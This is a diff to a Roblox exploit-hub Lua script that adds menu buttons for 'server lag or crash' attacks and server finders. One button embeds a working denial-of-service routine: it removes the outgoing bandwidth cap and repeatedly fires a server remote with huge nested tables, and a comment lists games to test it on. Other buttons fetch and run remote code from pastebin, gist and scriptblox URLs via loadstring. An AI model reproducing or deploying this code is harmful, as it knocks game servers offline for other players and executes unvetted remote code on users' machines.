@@ -1,6 +1,6 @@
 --[[
 Last Updated on 2/24/2024 
-added Universal FE hub thing
+added server searchers/finders and server crashers/laggers
 ]]--
 local OptTheme = "Midnight"
 local string = "https://discord.gg/xwy5Cu62Vw"
@@ -60,6 +60,105 @@ local Library = loadstring(game:HttpGet(_G.guidragtype))()
 
 					  MainSection:NewButton("FE Universal Script hub or sum", "hella stuff", function()
 						loadstring(game:HttpGet('https://gist.githubusercontent.com/Dvrknvss/e2a906135f9e55d0d2ae7aaf337d8937/raw/dc055592803f8418ddf8ba7b84286f47638849d4/noidea'))()
+					 end)
+					 MainSection:NewButton("FE server lag or crash", "idk", function()
+						loadstring(game:HttpGet("https://pastebin.com/raw/yGqP4zFa"))()
+					 end)
+					 MainSection:NewButton("FE server lag or crash 2", "only works some games", function()
+						--[[GOOD GAMES TO TEST ON:
+					 https://www.roblox.com/games/4714308751/
+					 https://www.roblox.com/games/2609668898/
+					 https://www.roblox.com/games/738339342/
+					  
+					 games with stuff moving and pvp]]--
+						shared.TeleportToSky = false -- for games that show ur ping (like custom duels)
+
+if shared.TeleportToSky then
+local char = game:GetService('Players').LocalPlayer.Character
+char.HumanoidRootPart.CFrame = CFrame.new(0,9e9,0)
+task.wait(0.5)
+char.HumanoidRootPart.Anchored = true
+end
+while wait(1.5) do --// don't change it's the best
+game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge * math.huge)
+local function getmaxvalue(val)
+   local mainvalueifonetable = 499999
+   if type(val) ~= "number" then
+       return nil
+   end
+   local calculateperfectval = (mainvalueifonetable/(val+2))
+   return calculateperfectval
+end
+ 
+local function bomb(tableincrease, tries)
+local maintable = {}
+local spammedtable = {}
+ 
+table.insert(spammedtable, {})
+z = spammedtable[1]
+ 
+for i = 1, tableincrease do
+    local tableins = {}
+    table.insert(z, tableins)
+    z = tableins
+end
+ 
+local calculatemax = getmaxvalue(tableincrease)
+local maximum
+ 
+if calculatemax then
+     maximum = calculatemax
+     else
+     maximum = 999999
+end
+ 
+for i = 1, maximum do
+     table.insert(maintable, spammedtable)
+end
+ 
+for i = 1, tries do
+     game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
+end
+end
+ 
+bomb(289, 5) --// change values if client crashes
+end
+					 end)
+					 MainSection:NewButton("FE server lag or crash 3", "This script is designed for skill-based games such as Hood Customs and More", function()
+						--[[TESTED ON THE FOLLOWING GAMES:
+Arsenal
+Phantom Forces
+Da Hood
+Hood Customs
+Hood Duels
+Hood Modded FFA
+Almost all Da Hood Related Games
+Almost all Raytracing games]]--
+						loadstring(game:HttpGet("https://pastebin.com/raw/yGqP4zFa"))()
+					 end)
+					 MainSection:NewButton("Small server Joiner", "small", function()
+						local Http = game:GetService("HttpService")
+local TPS = game:GetService("TeleportService")
+local Api = "https://games.roblox.com/v1/games/"
+
+local _place = game.PlaceId
+local _servers = Api.._place.."/servers/Public?sortOrder=Asc&limit=100"
+function ListServers(cursor)
+   local Raw = game:HttpGet(_servers .. ((cursor and "&cursor="..cursor) or ""))
+   return Http:JSONDecode(Raw)
+end
+
+local Server, Next; repeat
+   local Servers = ListServers(Next)
+   Server = Servers.data[1]
+   Next = Servers.nextPageCursor
+until Server
+
+TPS:TeleportToPlaceInstance(_place,Server.id,game.Players.LocalPlayer)
+
+					 end)
+					 MainSection:NewButton("Server Browser", "hella stuff", function()
+						loadstring(game:HttpGet("https://www.scriptblox.com/raw/Server-Browser_80", true))();
 					 end)
 					  MainSection:NewButton("System Broken FE", "w", function()
 						local credits = "SystemBroken made by system_calix"
